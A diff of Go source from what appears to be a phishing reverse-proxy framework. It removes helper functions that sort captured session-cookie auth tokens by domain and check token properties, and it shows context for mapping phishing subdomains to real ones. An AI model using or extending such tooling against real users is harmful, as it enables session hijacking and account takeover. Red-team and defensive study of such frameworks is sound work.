@@ -871,24 +871,6 @@ func (p *Phishlet) GetScriptInjectById(id string, params *map[string]string) (st
 	return "", fmt.Errorf("script not found")
 }
 
-func (p *Phishlet) GenerateTokenSet(tokens map[string]string) map[string]map[string]string {
-	ret := make(map[string]map[string]string)
-	td := make(map[string]string)
-	for domain, tokens := range p.cookieAuthTokens {
-		ret[domain] = make(map[string]string)
-		for _, t := range tokens {
-			td[t.name] = domain
-		}
-	}
-
-	for k, v := range tokens {
-		if domain, ok := td[k]; ok {
-			ret[domain][k] = v
-		}
-	}
-	return ret
-}
-
 func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, domain string, handle_session bool, is_landing bool, auto_filter bool) {
 	phish_subdomain = strings.ToLower(phish_subdomain)
 	orig_subdomain = strings.ToLower(orig_subdomain)
@@ -1040,24 +1022,6 @@ func (p *Phishlet) getAuthToken(domain string, token string) *CookieAuthToken {
 		}
 	}
 	return nil
-}
-
-func (p *Phishlet) isAuthToken(domain string, token string) bool {
-	if at := p.getAuthToken(domain, token); at != nil {
-		return true
-	}
-	return false
-}
-
-func (p *Phishlet) isTokenHttpOnly(domain string, token string) bool {
-	if at := p.getAuthToken(domain, token); at != nil {
-		return at.http_only
-	}
-	return false
-}
-
-func (p *Phishlet) MimeExists(mime string) bool {
-	return false
 }
 
 func (p *Phishlet) isVersionHigherEqual(pv *PhishletVersion, cver string) bool {
